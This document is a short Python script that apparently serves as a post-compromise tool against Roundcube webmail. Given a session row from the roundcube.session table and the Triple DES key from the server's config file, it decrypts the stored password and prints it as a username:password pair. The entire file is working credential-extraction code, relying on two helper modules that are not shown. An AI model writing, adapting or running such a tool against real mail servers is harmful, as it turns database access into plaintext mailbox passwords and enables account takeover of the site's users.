#!/usr/bin/env python3

import argparse
from base64 import b64decode
from binascii import hexlify
from php_deserializer import PHPSessionDeserializer
from tripledes import TripleDESDecryptor

def build_args() -> argparse.ArgumentParser :
    parser = argparse.ArgumentParser(
        description="Decrypt user's password from user's session stored in DB."
    )

    parser.add_argument(
        '--session',
        type=str,
        help="Session stored in roundcube.session table",
        required=True
    )
    parser.add_argument(
        '--des-key',
        '-k',
        type=str,
        help='Triple DES key located in config/config.inc.php',
        required=True
    )

    return parser

def extract_creds(session: str) -> tuple[str, str, str]:
    php_serialized_session = b64decode(session).decode()
    deserializer = PHPSessionDeserializer()
    data = deserializer.deserialize(php_serialized_session)
    
    iv = hexlify(b64decode(data["password"]))[:8*2].decode()
    password = hexlify(b64decode(data["password"]))[8*2:].decode()
    
    return data["username"], password, iv

def decrypt_user_session(password, key, iv) -> str:
    decryptor = TripleDESDecryptor(key=key, iv_hex=iv)
    return decryptor.decrypt(secret_hex=password)

if __name__ == '__main__':
    args = build_args().parse_args()

    username, password_hex, iv_hex  = extract_creds(args.session)
    print(f"[+] {username}:{decrypt_user_session(password_hex, args.des_key, iv_hex)}")
